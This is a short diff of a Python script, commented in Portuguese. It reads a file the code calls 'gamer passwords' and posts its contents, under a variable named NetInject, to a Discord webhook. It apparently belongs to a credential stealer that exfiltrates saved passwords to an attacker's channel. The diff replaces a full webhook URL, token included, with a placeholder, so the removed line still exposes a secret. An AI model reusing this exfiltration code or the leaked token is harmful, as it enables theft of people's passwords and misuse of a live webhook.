@@ -45,5 +45,5 @@ with open ("Appsaves.txt", "r") as senhasgamers:
     
 # Integração webhook com o discord.
 
-webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1150539523663605882/Z_AezEKC5gYw_TCE20canPY0qygZGIRYS4ia0EeATCZJwOoWtoARNdv-MFfUWqlVpNON", content="{}".format(NetInject))
+webhook = DiscordWebhook(url="(DISCORD WEBHOOK TOKEN"), content="{}".format(NetInject))
 response = webhook.execute()
